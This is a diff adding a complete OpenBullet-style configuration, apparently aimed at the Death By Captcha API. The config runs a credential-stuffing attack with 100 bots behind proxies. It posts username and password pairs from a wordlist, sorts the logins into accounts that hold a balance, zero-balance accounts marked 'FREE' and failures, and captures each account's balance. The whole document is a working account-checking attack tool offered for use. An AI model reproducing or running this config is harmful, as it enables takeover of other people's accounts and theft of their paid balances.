@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "DBC",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-05T17:12:19.2917689+00:00",
+  "AdditionalInfo": "Accounts with 0 balance go to FREE",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "http://api.dbcapi.me/api/user" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success AND 
+    KEY "balance=" 
+    KEY "<SOURCE>" DoesNotContain "balance=0.0" 
+  KEYCHAIN Failure OR 
+    KEY "not-logged-in" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "balance=0.0" 
+PARSE "<SOURCE>" LR "balance=" "&" Recursive=FALSE -> CAP "Balance" "" "" 
